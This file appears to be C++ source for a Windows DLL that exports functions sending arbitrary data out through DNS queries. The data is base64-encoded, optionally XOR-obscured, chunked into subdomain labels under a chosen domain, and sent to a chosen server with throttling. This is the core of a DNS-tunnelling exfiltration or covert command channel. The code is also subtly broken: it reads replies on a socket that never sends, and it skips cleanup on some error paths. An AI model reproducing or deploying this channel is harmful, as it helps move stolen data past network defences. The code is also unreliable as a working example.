#ifdef _WIN32
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#else
#include <arpa/inet.h>
#endif
#include <string>

#include "dns.h"
#include "encoding.h"
#include "transport.h"

// external base64
extern "C" char* base64_encode(const unsigned char*, size_t, size_t*);

#define DLL_EXPORT extern "C" __declspec(dllexport)

DLL_EXPORT bool SendDnsData(
    const char* msg,
    const char* dnsServer,
    const char* baseDomain,
    unsigned short port)
{
    if (!msg || !dnsServer || !baseDomain)
        return false;

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0)
        return false;

    size_t b64_len;
    char* encoded = base64_encode(
        (const unsigned char*)msg,
        strlen(msg),
        &b64_len);

    if (!encoded) return false;

    std::string data(encoded);
    free(encoded);

    auto chunks = chunkData(data);

    for (auto& chunk : chunks)
    {
        std::string domain = makeDomainChunk(chunk, baseDomain);
        auto packet = buildDnsQuery(domain);

        sendDnsQueryRaw(packet, dnsServer, port);

        Sleep(100);
    }

    WSACleanup();
    return true;
}

DLL_EXPORT bool SendDnsDataBidirectional(
    const char* msg,
    const char* dnsServer,
    const char* baseDomain,
    const char* key,
    unsigned short port)
{
    if (!msg || !dnsServer || !baseDomain)
        return false;

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0)
        return false;

    std::string data(msg);

    if (key && strlen(key) > 0) {
        data = xorEncrypt(data, key);
    }

    size_t b64_len;
    char* encoded = base64_encode(
        (const unsigned char*)data.c_str(),
        data.size(),
        &b64_len);

    if (!encoded) return false;

    std::string encodedStr(encoded);
    free(encoded);

    auto chunks = chunkData(encodedStr);

    SOCKET sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

    sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, dnsServer, &addr.sin_addr);

    for (auto& chunk : chunks)
    {
        std::string domain = makeDomainChunk(chunk, baseDomain);
        auto packet = buildDnsQuery(domain);

        sendDnsQueryRaw(packet, dnsServer, port);

        // optional response handling (fixed socket usage)
        char buffer[512];
        int len = sizeof(addr);

        recvfrom(sock, buffer, sizeof(buffer), 0,
                 (sockaddr*)&addr, &len);

        Sleep(100);
    }

    closesocket(sock);
    WSACleanup();
    return true;
}